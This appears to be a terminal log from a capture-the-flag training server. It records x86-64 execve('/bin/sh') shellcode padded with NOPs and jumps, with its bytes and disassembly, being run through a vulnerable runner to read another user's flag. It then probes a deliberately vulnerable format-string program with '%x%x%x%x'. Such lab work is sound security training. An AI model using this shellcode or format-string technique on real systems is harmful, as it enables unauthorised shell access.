+s,                                                                           
+          =frames-interp,=str,=loc,=Ranges,=pubtypes,
+          =gdb_index,=trace_info,=trace_abbrev,=trace_aranges,
+          =addr,=cu_index]
+                           Display DWARF info in the file
+  -t, --syms               Display the contents of the symbol table(s)
+  -T, --dynamic-syms       Display the contents of the dynamic symbol table
+  -r, --reloc              Display the relocation entries in the file
+  -R, --dynamic-reloc      Display the dynamic relocation entries in the file
+  @<file>                  Read options from <file>
+  -v, --version            Display this program's version number
+  -i, --info               List object formats and architectures supported
+  -H, --help               Display this information
+sp794@c-challenges-sp794-1:~$ objdump shellcode-withnop.o  -d
+
+shellcode-withnop.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <_start>:
+   0:   eb 2b                   jmp    2d <_push_filename>
+
+0000000000000002 <_main>:
+   2:   31 c0                   xor    %eax,%eax
+   4:   5f                      pop    %rdi
+   5:   90                      nop
+   6:   eb 01                   jmp    9 <_main+0x7>
+   8:   90                      nop
+   9:   48 83 c7 04             add    $0x4,%rdi
+   d:   90                      nop
+   e:   90                      nop
+   f:   eb 01                   jmp    12 <_main+0x10>
+  11:   90                      nop
+  12:   80 77 07 41             xorb   $0x41,0x7(%rdi)
+  16:   90                      nop
+  17:   90                      nop
+  18:   eb 01                   jmp    1b <_main+0x19>
+  1a:   90                      nop
+  1b:   48 31 f6                xor    %rsi,%rsi
+  1e:   48 31 d2                xor    %rdx,%rdx
+  21:   eb 01                   jmp    24 <_main+0x22>
+  23:   90                      nop
+  24:   b0 3b                   mov    $0x3b,%al
+  26:   0f 05                   syscall 
+  28:   90                      nop
+  29:   90                      nop
+  2a:   eb 01                   jmp    2d <_push_filename>
+  2c:   90                      nop
+
+000000000000002d <_push_filename>:
+  2d:   e8 d0 ff ff ff          callq  2 <_main>
+  32:   90                      nop
+  33:   eb 01                   jmp    36 <path>
+  35:   90                      nop
+
+0000000000000036 <path>:
+  36:   2f                      (bad)  
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x40071d (<main>:  push   rbp)
+RBX: 0x0 
+RCX: 0x0 
+RDX: 0x7fffffffe6a8 --> 0x7fffffffe8c8 ("XDG_SESSION_ID=21")
+RSI: 0x7fffffffe698 --> 0x7fffffffe8b3 ("/home/sp794/invitro2")
+RDI: 0x1 
+RBP: 0x7fffffffe5b0 --> 0x0 
+RSP: 0x7fffffffe5b0 --> 0x0 
+RIP: 0x400721 (<main+4>:        sub    rsp,0xc0)
+R8 : 0x7ffff7dd4e80 --> 0x0 
+R9 : 0x7ffff7dea530 (push   rbp)
+R10: 0x7fffffffe440 --> 0x0 
+R11: 0x7ffff7a36e50 (<__libc_start_main>:       push   r14)
+R12: 0x400630 (<_start>:        xor    ebp,ebp)
+R13: 0x7fffffffe690 --> 0x1 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflo)
+[-------------------------------------code------------------------------------
+-]                                                                           
+   0x400718 <frame_dummy+40>:   jmp    0x400690 <register_tm_clones>
+   0x40071d <main>:     push   rbp
+   0x40071e <main+1>:   mov    rbp,rsp
+=> 0x400721 <main+4>:   sub    rsp,0xc0
+   0x400728 <main+11>:  mov    DWORD PTR [rbp-0xb4],edi
+   0x40072e <main+17>:  mov    QWORD PTR [rbp-0xc0],rsi
+   0x400735 <main+24>:  lea    rsi,[rbp-0x90]
+   0x40073c <main+31>:  mov    eax,0x0
+[------------------------------------stack------------------------------------
+-]                                                                           
+0000| 0x7fffffffe5b0 --> 0x0 
+0008| 0x7fffffffe5b8 --> 0x7ffff7a36f45 (<__libc_start_main+245>:       mov   
+ edi,eax)                                                                    
+0016| 0x7fffffffe5c0 --> 0x0 
+0024| 0x7fffffffe5c8 --> 0x7fffffffe698 --> 0x7fffffffe8b3 ("/home/sp794/invit
+ro2")                                                                        
+0032| 0x7fffffffe5d0 --> 0x100000000 
+0040| 0x7fffffffe5d8 --> 0x40071d (<main>:      push   rbp)
+0048| 0x7fffffffe5e0 --> 0x0 
+0056| 0x7fffffffe5e8 --> 0x7fbecd2743b89146 
+[-----------------------------------------------------------------------------
+-]                                                                           
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x0000000000400721 in main ()
+gdb-peda$ disas
+Dump of assembler code for function main:
+   0x000000000040071d <+0>:     push   rbp
+   0x000000000040071e <+1>:     mov    rbp,rsp
+=> 0x0000000000400721 <+4>:     sub    rsp,0xc0
+   0x0000000000400728 <+11>:    mov    DWORD PTR [rbp-0xb4],edi
+   0x000000000040072e <+17>:    mov    QWORD PTR [rbp-0xc0],rsi
+   0x0000000000400735 <+24>:    lea    rsi,[rbp-0x90]
+   0x000000000040073c <+31>:    mov    eax,0x0
+   0x0000000000400741 <+36>:    mov    edx,0x10
+   0x0000000000400746 <+41>:    mov    rdi,rsi
+   0x0000000000400749 <+44>:    mov    rcx,rdx
+   0x000000000040074c <+47>:    rep stos QWORD PTR es:[rdi],rax
+   0x000000000040074f <+50>:    cmp    DWORD PTR [rbp-0xb4],0x1
+   0x0000000000400756 <+57>:    jg     0x400785 <main+104>
+   0x0000000000400758 <+59>:    mov    rax,QWORD PTR [rbp-0xc0]
+   0x000000000040075f <+66>:    mov    rdx,QWORD PTR [rax]
+   0x0000000000400762 <+69>:    mov    rax,QWORD PTR [rip+0x200907]        # 0
+x601070 <stderr@@GLIBC_2.2.5>                                                
+   0x0000000000400769 <+76>:    mov    esi,0x400968
+   0x000000000040076e <+81>:    mov    rdi,rax
+   0x0000000000400771 <+84>:    mov    eax,0x0
+   0x0000000000400776 <+89>:    call   0x4005f0 <fprintf@plt>
+   0x000000000040077b <+94>:    mov    eax,0x1
+   0x0000000000400780 <+99>:    jmp    0x4008d5 <main+440>
+   0x0000000000400785 <+104>:   mov    rax,QWORD PTR [rbp-0xc0]
+   0x000000000040078c <+111>:   add    rax,0x8
+   0x0000000000400790 <+115>:   mov    rax,QWORD PTR [rax]
+   0x0000000000400793 <+118>:   mov    esi,0x40097d
+   0x0000000000400798 <+123>:   mov    rdi,rax
+   0x000000000040079b <+126>:   call   0x400620 <fopen@plt>
+   0x00000000004007a0 <+131>:   mov    QWORD PTR [rbp-0x10],rax
+   0x00000000004007a4 <+135>:   cmp    QWORD PTR [rbp-0x10],0x0
+   0x00000000004007a9 <+140>:   jne    0x4007dc <main+191>
+   0x00000000004007ab <+142>:   mov    rax,QWORD PTR [rbp-0xc0]
+   0x00000000004007b2 <+149>:   add    rax,0x8
+   0x00000000004007b6 <+153>:   mov    rdx,QWORD PTR [rax]
+   0x00000000004007b9 <+156>:   mov    rax,QWORD PTR [rip+0x2008b0]        # 0
+x601070 <stderr@@GLIBC_2.2.5>                                                
+   0x00000000004007c0 <+163>:   mov    esi,0x400980
+   0x00000000004007c5 <+168>:   mov    rdi,rax
+   0x00000000004007c8 <+171>:   mov    eax,0x0
+   0x00000000004007cd <+176>:   call   0x4005f0 <fprintf@plt>
+   0x00000000004007d2 <+181>:   mov    eax,0x1
+   0x00000000004007d7 <+186>:   jmp    0x4008d5 <main+440>
+   0x00000000004007dc <+191>:   mov    DWORD PTR [rbp-0x4],0x0
+   0x00000000004007e3 <+198>:   jmp    0x400836 <main+281>
+   0x00000000004007e5 <+200>:   mov    QWORD PTR [rbp-0xa8],0x0
+   0x00000000004007f0 <+211>:   mov    rdx,QWORD PTR [rbp-0x10]
+   0x00000000004007f4 <+215>:   lea    rax,[rbp-0xa8]
+   0x00000000004007fb <+222>:   mov    rcx,rdx
+   0x00000000004007fe <+225>:   mov    edx,0x1
+   0x0000000000400803 <+230>:   mov    esi,0x8
+   0x0000000000400808 <+235>:   mov    rdi,rax
+   0x000000000040080b <+238>:   call   0x4005b0 <fread@plt>
+   0x0000000000400810 <+243>:   lea    rdx,[rbp-0x90]
+   0x0000000000400817 <+250>:   mov    eax,DWORD PTR [rbp-0x4]
+   0x000000000040081a <+253>:   cdqe   
+   0x000000000040081c <+255>:   add    rdx,rax
+   0x000000000040081f <+258>:   mov    rax,QWORD PTR [rbp-0xa8]
+   0x0000000000400826 <+265>:   mov    QWORD PTR [rdx],rax
+   0x0000000000400829 <+268>:   mov    eax,DWORD PTR [rbp-0x4]
+   0x000000000040082c <+271>:   add    eax,0x8
+   0x000000000040082f <+274>:   mov    DWORD PTR [rbp-0x4],eax
+   0x0000000000400832 <+277>:   add    DWORD PTR [rbp-0x4],0x1
+   0x0000000000400836 <+281>:   cmp    DWORD PTR [rbp-0x4],0x7f
+   0x000000000040083a <+285>:   jg     0x40084c <main+303>
+   0x000000000040083c <+287>:   mov    rax,QWORD PTR [rbp-0x10]
+   0x0000000000400840 <+291>:   mov    rdi,rax
+   0x0000000000400843 <+294>:   call   0x400600 <feof@plt>
+   0x0000000000400848 <+299>:   test   eax,eax
+   0x000000000040084a <+301>:   je     0x4007e5 <main+200>
+   0x000000000040084c <+303>:   mov    DWORD PTR [rbp-0x8],0x0
+   0x0000000000400853 <+310>:   jmp    0x400891 <main+372>
+   0x0000000000400855 <+312>:   mov    eax,DWORD PTR [rbp-0x8]
+   0x0000000000400858 <+315>:   and    eax,0x7
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x40071d (<main>:  push   rbp)
+RBX: 0x0 
+RCX: 0x0 
+RDX: 0x7fffffffe6a0 --> 0x7fffffffe8c8 ("XDG_SESSION_ID=21")
+RSI: 0x7fffffffe688 --> 0x7fffffffe8a9 ("/home/sp794/invitro2")
+RDI: 0x2 
+RBP: 0x7fffffffe5a0 --> 0x0 
+RSP: 0x7fffffffe5a0 --> 0x0 
+RIP: 0x400721 (<main+4>:        sub    rsp,0xc0)
+R8 : 0x7ffff7dd4e80 --> 0x0 
+R9 : 0x7ffff7dea530 (push   rbp)
+R10: 0x7fffffffe430 --> 0x0 
+R11: 0x7ffff7a36e50 (<__libc_start_main>:       push   r14)
+R12: 0x400630 (<_start>:        xor    ebp,ebp)
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x7fffffffe510 --> 0x1eb905fc0312beb 
+RBX: 0x0 
+RCX: 0xffffffffffffffff 
+RDX: 0x7ffff7dd59d0 --> 0x0 
+RSI: 0x7fffffffbde0 ("Read 72 bytes of shellcode! Executing...\n")
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x7fffffffe510 --> 0x1eb905fc0312beb 
+RBX: 0x0 
+RCX: 0xffffffffffffffff 
+RDX: 0x7ffff7dd59d0 --> 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x7fffffffe510 --> 0x1eb905fc0312beb 
+RBX: 0x0 
+RCX: 0xffffffffffffffff 
+RDX: 0x7ffff7dd59d0 --> 0x0 
+RSI: 0x7fffffffbde0 ("Read 72 bytes of shellcode! Executing...\n")
+RDI: 0x2 
+RBP: 0x7fffffffe5a0 --> 0x0 
+RSP: 0x7fffffffe4e0 --> 0x7fffffffe688 --> 0x7fffffffe8a9 ("/home/sp794/invitr
+o2")                                                                         
+RIP: 0x7fffffffe53d --> 0x1eb90ffffffd0e8 
+R8 : 0x7ffff7fee740 (0x00007ffff7fee740)
+R9 : 0x6365784520216564 ('de! Exec')
+R10: 0x2e2e2e676e697475 ('uting...')
+R11: 0x246 
+R12: 0x400630 (<_start>:        xor    ebp,ebp)
+R13: 0x7fffffffe680 --> 0x2 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflo)
+[-------------------------------------code------------------------------------
+-]                                                                           
+   0x7fffffffe533:      add    BYTE PTR [rax-0x6ffaf0c5],dh
+   0x7fffffffe539:      nop
+   0x7fffffffe53a:      jmp    0x7fffffffe53d
+   0x7fffffffe53c:      add    al,ch
+   0x7fffffffe53e:      sar    bh,1
+   0x7fffffffe540:      (bad)  
+   0x7fffffffe541:      call   QWORD PTR [rax+0x2f0001eb]
+   0x7fffffffe547:      (bad)
+No argument
+[------------------------------------stack------------------------------------
+-]                                                                           
+0000| 0x7fffffffe4e0 --> 0x7fffffffe688 --> 0x7fffffffe8a9 ("/home/sp794/invit
+ro2")                                                                        
+0008| 0x7fffffffe4e8 --> 0x200000000 
+0016| 0x7fffffffe4f0 --> 0x0 
+0024| 0x7fffffffe4f8 --> 0x0 
+0032| 0x7fffffffe500 --> 0x0 
+0040| 0x7fffffffe508 --> 0x7ffff7ffe520 --> 0x7ffff7ffe480 --> 0x7ffff7ff99c8 
+--> 0x7ffff7ffe1c8 --> 0x0                                                   
+0048| 0x7fffffffe510 --> 0x1eb905fc0312beb 
+0056| 0x7fffffffe518 --> 0xeb909003c7834800 
+[-----------------------------------------------------------------------------
+-]                                                                           
+Legend: code, data, rodata, value
+0x00007fffffffe53d in ?? ()
+gdb-peda$ q  
+sp794@c-challenges-sp794-1:~$ gdb invitro2                     
+GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1
+Copyright (C) 2014 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x40071d (<main>:  push   rbp)
+RBX: 0x0 
+RCX: 0x0 
+RDX: 0x7fffffffe6a8 --> 0x7fffffffe8c8 ("XDG_SESSION_ID=21")
+RSI: 0x7fffffffe698 --> 0x7fffffffe8b3 ("/home/sp794/invitro2")
+RDI: 0x1 
+RBP: 0x7fffffffe5b0 --> 0x0 
+RSP: 0x7fffffffe5b0 --> 0x0 
+RIP: 0x400721 (<main+4>:        sub    rsp,0xc0)
+R8 : 0x7ffff7dd4e80 --> 0x0 
+R9 : 0x7ffff7dea530 (push   rbp)
+R10: 0x7fffffffe440 --> 0x0 
+R11: 0x7ffff7a36e50 (<__libc_start_main>:       push   r14)
+R12: 0x400630 (<_start>:        xor    ebp,ebp)
+R13: 0x7fffffffe690 --> 0x1 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflo)
+[-------------------------------------code------------------------------------
+-]                                                                           
+   0x400718 <frame_dummy+40>:   jmp    0x400690 <register_tm_clones>
+   0x40071d <main>:     push   rbp
+   0x40071e <main+1>:   mov    rbp,rsp
+=> 0x400721 <main+4>:   sub    rsp,0xc0
+   0x400728 <main+11>:  mov    DWORD PTR [rbp-0xb4],edi
+   0x40072e <main+17>:  mov    QWORD PTR [rbp-0xc0],rsi
+   0x400735 <main+24>:  lea    rsi,[rbp-0x90]
+   0x40073c <main+31>:  mov    eax,0x0
+[------------------------------------stack------------------------------------
+-]                                                                           
+0000| 0x7fffffffe5b0 --> 0x0 
+0008| 0x7fffffffe5b8 --> 0x7ffff7a36f45 (<__libc_start_main+245>:       mov   
+ edi,eax)                                                                    
+0016| 0x7fffffffe5c0 --> 0x0 
+0024| 0x7fffffffe5c8 --> 0x7fffffffe698 --> 0x7fffffffe8b3 ("/home/sp794/invit
+ro2")                                                                        
+0032| 0x7fffffffe5d0 --> 0x100000000 
+0040| 0x7fffffffe5d8 --> 0x40071d (<main>:      push   rbp)
+0048| 0x7fffffffe5e0 --> 0x0 
+0056| 0x7fffffffe5e8 --> 0x439829db9e1401b7 
+[-----------------------------------------------------------------------------
+-]                                                                           
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x0000000000400721 in main ()
+gdb-peda$ disas
+Dump of assembler code for function main:
+   0x000000000040071d <+0>:     push   rbp
+   0x000000000040071e <+1>:     mov    rbp,rsp
+=> 0x0000000000400721 <+4>:     sub    rsp,0xc0
+   0x0000000000400728 <+11>:    mov    DWORD PTR [rbp-0xb4],edi
+   0x000000000040072e <+17>:    mov    QWORD PTR [rbp-0xc0],rsi
+   0x0000000000400735 <+24>:    lea    rsi,[rbp-0x90]
+   0x000000000040073c <+31>:    mov    eax,0x0
+   0x0000000000400741 <+36>:    mov    edx,0x10
+   0x0000000000400746 <+41>:    mov    rdi,rsi
+   0x0000000000400749 <+44>:    mov    rcx,rdx
+   0x000000000040074c <+47>:    rep stos QWORD PTR es:[rdi],rax
+   0x000000000040074f <+50>:    cmp    DWORD PTR [rbp-0xb4],0x1
+   0x0000000000400756 <+57>:    jg     0x400785 <main+104>
+   0x0000000000400758 <+59>:    mov    rax,QWORD PTR [rbp-0xc0]
+   0x000000000040075f <+66>:    mov    rdx,QWORD PTR [rax]
+   0x0000000000400762 <+69>:    mov    rax,QWORD PTR [rip+0x200907]        # 0
+x601070 <stderr@@GLIBC_2.2.5>                                                
+   0x0000000000400769 <+76>:    mov    esi,0x400968
+   0x000000000040076e <+81>:    mov    rdi,rax
+   0x0000000000400771 <+84>:    mov    eax,0x0
+   0x0000000000400776 <+89>:    call   0x4005f0 <fprintf@plt>
+   0x000000000040077b <+94>:    mov    eax,0x1
+   0x0000000000400780 <+99>:    jmp    0x4008d5 <main+440>
+   0x0000000000400785 <+104>:   mov    rax,QWORD PTR [rbp-0xc0]
+   0x000000000040078c <+111>:   add    rax,0x8
+   0x0000000000400790 <+115>:   mov    rax,QWORD PTR [rax]
+   0x0000000000400793 <+118>:   mov    esi,0x40097d
+   0x0000000000400798 <+123>:   mov    rdi,rax
+   0x000000000040079b <+126>:   call   0x400620 <fopen@plt>
+   0x00000000004007a0 <+131>:   mov    QWORD PTR [rbp-0x10],rax
+   0x00000000004007a4 <+135>:   cmp    QWORD PTR [rbp-0x10],0x0
+   0x00000000004007a9 <+140>:   jne    0x4007dc <main+191>
+   0x00000000004007ab <+142>:   mov    rax,QWORD PTR [rbp-0xc0]
+   0x00000000004007b2 <+149>:   add    rax,0x8
+   0x00000000004007b6 <+153>:   mov    rdx,QWORD PTR [rax]
+   0x00000000004007b9 <+156>:   mov    rax,QWORD PTR [rip+0x2008b0]        # 0
+x601070 <stderr@@GLIBC_2.2.5>                                                
+   0x00000000004007c0 <+163>:   mov    esi,0x400980
+   0x00000000004007c5 <+168>:   mov    rdi,rax
+   0x00000000004007c8 <+171>:   mov    eax,0x0
+   0x00000000004007cd <+176>:   call   0x4005f0 <fprintf@plt>
+   0x00000000004007d2 <+181>:   mov    eax,0x1
+   0x00000000004007d7 <+186>:   jmp    0x4008d5 <main+440>
+   0x00000000004007dc <+191>:   mov    DWORD PTR [rbp-0x4],0x0
+   0x00000000004007e3 <+198>:   jmp    0x400836 <main+281>
+   0x00000000004007e5 <+200>:   mov    QWORD PTR [rbp-0xa8],0x0
+   0x00000000004007f0 <+211>:   mov    rdx,QWORD PTR [rbp-0x10]
+   0x00000000004007f4 <+215>:   lea    rax,[rbp-0xa8]
+   0x00000000004007fb <+222>:   mov    rcx,rdx
+   0x00000000004007fe <+225>:   mov    edx,0x1
+   0x0000000000400803 <+230>:   mov    esi,0x8
+   0x0000000000400808 <+235>:   mov    rdi,rax
+   0x000000000040080b <+238>:   call   0x4005b0 <fread@plt>
+   0x0000000000400810 <+243>:   lea    rdx,[rbp-0x90]
+   0x0000000000400817 <+250>:   mov    eax,DWORD PTR [rbp-0x4]
+   0x000000000040081a <+253>:   cdqe   
+   0x000000000040081c <+255>:   add    rdx,rax
+   0x000000000040081f <+258>:   mov    rax,QWORD PTR [rbp-0xa8]
+   0x0000000000400826 <+265>:   mov    QWORD PTR [rdx],rax
+   0x0000000000400829 <+268>:   mov    eax,DWORD PTR [rbp-0x4]
+   0x000000000040082c <+271>:   add    eax,0x8
+   0x000000000040082f <+274>:   mov    DWORD PTR [rbp-0x4],eax
+   0x0000000000400832 <+277>:   add    DWORD PTR [rbp-0x4],0x1
+   0x0000000000400836 <+281>:   cmp    DWORD PTR [rbp-0x4],0x7f
+   0x000000000040083a <+285>:   jg     0x40084c <main+303>
+   0x000000000040083c <+287>:   mov    rax,QWORD PTR [rbp-0x10]
+   0x0000000000400840 <+291>:   mov    rdi,rax
+   0x0000000000400843 <+294>:   call   0x400600 <feof@plt>
+   0x0000000000400848 <+299>:   test   eax,eax
+   0x000000000040084a <+301>:   je     0x4007e5 <main+200>
+   0x000000000040084c <+303>:   mov    DWORD PTR [rbp-0x8],0x0
+   0x0000000000400853 <+310>:   jmp    0x400891 <main+372>
+   0x0000000000400855 <+312>:   mov    eax,DWORD PTR [rbp-0x8]
+   0x0000000000400858 <+315>:   and    eax,0x7
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x40071d (<main>:  push   rbp)
+RBX: 0x0 
+RCX: 0x0 
+RDX: 0x7fffffffe6a0 --> 0x7fffffffe8c8 ("XDG_SESSION_ID=21")
+RSI: 0x7fffffffe688 --> 0x7fffffffe8a9 ("/home/sp794/invitro2")
+RDI: 0x2 
+RBP: 0x7fffffffe5a0 --> 0x0 
+RSP: 0x7fffffffe5a0 --> 0x0 
+RIP: 0x400721 (<main+4>:        sub    rsp,0xc0)
+R8 : 0x7ffff7dd4e80 --> 0x0 
+R9 : 0x7ffff7dea530 (push   rbp)
+R10: 0x7fffffffe430 --> 0x0 
+R11: 0x7ffff7a36e50 (<__libc_start_main>:       push   r14)
+R12: 0x400630 (<_start>:        xor    ebp,ebp)
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x7fffffffe510 --> 0x1eb905fc0312beb 
+RBX: 0x0 
+RCX: 0xffffffffffffffff 
+RDX: 0x7ffff7dd59d0 --> 0x0 
+RSI: 0x7fffffffbde0 ("Read 72 bytes of shellcode! Executing...\n")
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x7fffffffe510 --> 0x1eb905fc0312beb 
+RBX: 0x0 
+RCX: 0xffffffffffffffff 
+RDX: 0x7ffff7dd59d0 --> 0x0 
+RSI: 0x7fffffffbde0 ("Read 72 bytes of shellcode! Executing...\n")
+RDI: 0x2 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x7fffffffe510 --> 0x1eb905fc0312beb 
+RBX: 0x0 
+RCX: 0xffffffffffffffff 
+RDX: 0x7ffff7dd59d0 --> 0x0 
+RSI: 0x7fffffffbde0 ("Read 72 bytes of shellcode! Executing...\n")
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x0 
+RBX: 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x0 
+RBX: 0x0 
+RCX: 0xffffffffffffffff 
+RDX: 0x7ffff7dd59d0 --> 0x0 
+RSI: 0x7fffffffbde0 ("Read 72 bytes of shellcode! Executing...\n")
+RDI: 0x7fffffffe542 --> 0x6e69622f0001eb90 
+RBP: 0x7fffffffe5a0 --> 0x0 
+RSP: 0x7fffffffe4e0 --> 0x7fffffffe688 --> 0x7fffffffe8a9 ("/home/sp794/invitr
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x0 
+RBX: 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x0 
+RBX: 0x0 
+RCX: 0xffffffffffffffff 
+RDX: 0x7ffff7dd59d0 --> 0x0 
+RSI: 0x7fffffffbde0 ("Read 72 bytes of shellcode! Executing...\n")
+RDI: 0x7fffffffe545 --> 0x68732f6e69622f00 ('')
+RBP: 0x7fffffffe5a0 --> 0x0 
+RSP: 0x7fffffffe4e0 --> 0x7fffffffe688 --> 0x7fffffffe8a9 ("/home/sp794/invitr
+o2")                                                                         
+RIP: 0x7fffffffe51d --> 0x777800001eb9090 
+R8 : 0x7ffff7fee740 (0x00007ffff7fee740)
+R9 : 0x6365784520216564 ('de! Exec')
+R10: 0x2e2e2e676e697475 ('uting...')
+R11: 0x246 
+R12: 0x400630 (<_start>:        xor    ebp,ebp)
+R13: 0x7fffffffe680 --> 0x2 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflo)
+[-------------------------------------code------------------------------------
+-]                                                                           
+   0x7fffffffe513:      rcr    BYTE PTR [rdi-0x70],0xeb
+   0x7fffffffe517:      add    DWORD PTR [rax],eax
+   0x7fffffffe519:      add    rdi,0x3
+=> 0x7fffffffe51d:      nop
+   0x7fffffffe51e:      nop
+   0x7fffffffe51f:      jmp    0x7fffffffe522
+   0x7fffffffe521:      add    BYTE PTR [rax-0x6fbef889],al
+   0x7fffffffe527:      nop
+[------------------------------------stack------------------------------------
+-]                                                                           
+0000| 0x7fffffffe4e0 --> 0x7fffffffe688 --> 0x7fffffffe8a9 ("/home/sp794/invit
+ro2")                                                                        
+0008| 0x7fffffffe4e8 --> 0x200000000 
+0016| 0x7fffffffe4f0 --> 0x0 
+0024| 0x7fffffffe4f8 --> 0x0 
+0032| 0x7fffffffe500 --> 0x0 
+0040| 0x7fffffffe508 --> 0x7ffff7ffe520 --> 0x7ffff7ffe480 --> 0x7ffff7ff99c8 
+--> 0x7ffff7ffe1c8 --> 0x0                                                   
+0048| 0x7fffffffe510 --> 0x1eb905fc0312beb 
+0056| 0x7fffffffe518 --> 0xeb909003c7834800 
+[-----------------------------------------------------------------------------
+-]                                                                           
+Legend: code, data, rodata, value
+0x00007fffffffe51d in ?? ()
+gdb-peda$ quit
+sp794@c-challenges-sp794-1:~$ !gcc
+gcc shelltest2.c -o shelltest2
+sp794@c-challenges-sp794-1:~$ ./shelltest2
+sp794@c-challenges-sp794-1:~$ ./invitro2 shellcode
+
+eb 2b 31 c0 5f 90 eb 01 
+00 48 83 c7 04 90 90 eb 
+01 00 80 77 07 41 90 90 
+eb 01 00 48 31 f6 48 31 
+d2 eb 01 00 b0 3b 0f 05 
+90 90 eb 01 00 e8 d0 ff 
+ff ff 90 eb 01 00 2f 62 
+69 6e 2f 73 68 41 00 00 
+00 00 00 00 00 00 00 00 
+Read 72 bytes of shellcode! Executing...
+$ ls
+callme      invitro2.c                   shellcode-sh.asm     test
+callme.c    peda                         shellcode-withnop.o  test.c
+flag        peda-session-invitro2.txt    shellcode.asm        tmp
+invitro1    peda-session-shelltest2.txt  shellcode.o
+invitro1.c  shellcode                    shelltest2
+invitro2    shellcode-sh-withnop.asm     shelltest2.c
+$ exit
+sp794@c-challenges-sp794-1:~$ cd .. 
+sp794@c-challenges-sp794-1:/home$ cd invitro2
+sp794@c-challenges-sp794-1:/home/invitro2$ ls
+flag  invitro2  invitro2.c  Makefile
+sp794@c-challenges-sp794-1:/home/invitro2$ cd ..   
+sp794@c-challenges-sp794-1:/home$ ssh invitro1@localhost
+invitro1@localhost's password: 
+Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 3.13.0-24-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com/
+New release '16.04.1 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+Last login: Sun Nov 27 19:20:02 2016 from localhost
+$ cd ../invitro2
+$ ls
+flag  invitro2  invitro2.c  Makefile
+$ ./invitro2 /home/sp794/shellcode
+Read 72 bytes of shellcode! Executing...
+$ cat flag
+the flag is: you_are_a_hopscotch_master
+$ quit
+sh: 2: quit: not found
+$ exit
+$ exit
+Connection to localhost closed.
+sp794@c-challenges-sp794-1:/home$ ls
+callme  cowshout1  cowshout2  impossible  invitro1  invitro2  seashell  sp794
+sp794@c-challenges-sp794-1:/home$ cd        
+sp794@c-challenges-sp794-1:~$ ls
+callme      invitro2.c                   shellcode.o               test
+callme.c    peda                         shellcode-sh.asm          test.c
+flag        peda-session-invitro2.txt    shellcode-sh-withnop.asm  tmp
+invitro1    peda-session-shelltest2.txt  shellcode-withnop.o
+invitro1.c  shellcode                    shelltest2
+invitro2    shellcode.asm                shelltest2.c
+sp794@c-challenges-sp794-1:~$ ls
+callme      invitro2.c                   shellcode.o               test
+callme.c    peda                         shellcode-sh.asm          test.c
+flag        peda-session-invitro2.txt    shellcode-sh-withnop.asm  tmp
+invitro1    peda-session-shelltest2.txt  shellcode-withnop.o
+invitro1.c  shellcode                    shelltest2
+invitro2    shellcode.asm                shelltest2.c
+sp794@c-challenges-sp794-1:~$ cd ..
+sp794@c-challenges-sp794-1:/home$ cd seashell/
+sp794@c-challenges-sp794-1:/home/seashell$ ls
+flag  Makefile  seashell  seashell.c
+sp794@c-challenges-sp794-1:/home/seashell$ cat seashell.c
+#include <stdio.h>
+
+int is_admin = 0;
+
+void grant_admin(char *name) {
+    if (name == "administrator") {
+        is_admin = 1;
+    }
+}
+
+int main(int argc, char *argv[]) {
+    if (argc < 2) {
+        printf("Usage: %s name\n", argv[0]);
+        return 1;
+    }
+    char *name = argv[1];
+
+    printf("Hello, ");
+    printf(name);
+    printf("!\n");
+
+    grant_admin(name);
+
+    if (is_admin) {
+        printf("Here is your seashell:\n");
+        system("/bin/sh");
+    } else {
+        printf("I'm sorry ");
+        printf(name);
+        printf(", I'm afraid I can't do that.\n");
+    }
+
+    return 0;
+}
+sp794@c-challenges-sp794-1:/home/seashell$ ./seashell "%x%x%x%x"
+Hello, ff9fa034ff9fa040f760419df77783c4!
+I'm sorry ff9fa034ff9fa040f760419df77783c4, I'm afraid I can't do that.
+sp794@c-challenges-sp794-1:/home/seashell$ cd "                      
+> "
+-bash: cd: 
+: No such file or directory
+sp794@c-challenges-sp794-1:/home/seashell$ cd 
+sp794@c-challenges-sp794-1:~$  
